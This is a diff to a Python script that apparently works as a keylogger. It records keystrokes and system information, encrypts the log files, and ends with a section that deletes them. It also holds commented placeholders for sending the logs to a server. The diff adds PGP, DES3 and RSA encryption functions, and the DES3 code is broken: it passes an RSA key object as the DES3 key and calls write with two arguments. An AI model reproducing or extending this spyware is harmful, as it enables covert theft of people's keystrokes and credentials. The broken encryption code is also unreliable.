@@ -11,6 +11,12 @@ import os
 import getpass
 from requests import get
 import multiprocessing
+
+import gnupg
+from Crypto.Cipher import DES3
+from random import SystemRandom
+from Crypto import RSA
+from Crypto import Random
 from cryptography.fernet import Fernet
 
 
@@ -25,15 +31,6 @@ extend = "\\"
 extendedPath = path + extend
 
 
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
 # def sendFile():
 
@@ -131,28 +128,72 @@ while currentTime < endTime:
         endTime = time.time() + logTime
 
     
+
+
 ### ENCRYPT FILES HERE ###
-filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
-encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
+#PGP encryption
+def encrypt_gnupg(original_file, encrypt_file, email):
+    # encrypt file name original_file
+    # output in the dir and the encrypt file that we entered
+    gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
+                    gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')
+    with open(original_file, 'rb') as f:
+        status = gpg.encrypt_file(
+            f, recipients=[email],
+            output=encrypt_file + '.gpg')
+    print(status.ok)
+    print(status.status)
+    print(status.stderr)
+    print('~' * 50)
 
-count = 0
 
-for encryptingFile in filesToEncrypt:
+# des3 encryption
+# data- what we want to encrypt
+def des3_encrypt(original_file, encrypt_file):
+    with open(original_file, 'rb') as files:
+        data = files.read()
+    rand = SystemRandom()
+    iv = rand.getrandbits(64)
+    # random of the key
+    random_generator = Random.new().read
+    key = RSA.generate(1024, random_generator)
+    # asci version of the key
+    exportedKey = key.exportKey('PEM', 'my secret', pkcs=1)
+    encryptor = DES3.new(key, DES3.MODE_CBC, iv)
+    pad_len = 8 - len(data) % 8
+    # length of padding
+    padding = chr(pad_len) * pad_len
+    # PKCS5 padding content
+    data += padding
+    # writing to the file
+    f = open(encrypt_file, "a")
+    f.write(encryptor.encrypt(data), iv)
+    f.close()
+    return encryptor.encrypt(data), iv
 
-    with open(filesToEncrypt[count], 'rb') as f:
-        data = f.read()
+# Fernet Encryption
+def fernetEncrypt():
+    filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
+    encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
 
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
+    count = 0
 
-    with open(encryptedFileNames[count], 'wb') as f:
-        f.write(encrypted)
+    for encryptingFile in filesToEncrypt:
 
-    ### SEND ENCRYPTED FILES TO SERVER HERE ###
-    #sendFile()
-    count += 1
+        with open(filesToEncrypt[count], 'rb') as f:
+            data = f.read()
 
-time.sleep(120)
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
+
+        with open(encryptedFileNames[count], 'wb') as f:
+            f.write(encrypted)
+
+        ### SEND ENCRYPTED FILES TO SERVER HERE ###
+        #sendFile()
+        count += 1
+
+    time.sleep(120)
 
 
 ### Deletes Files After they are Encrypted and Sent ###
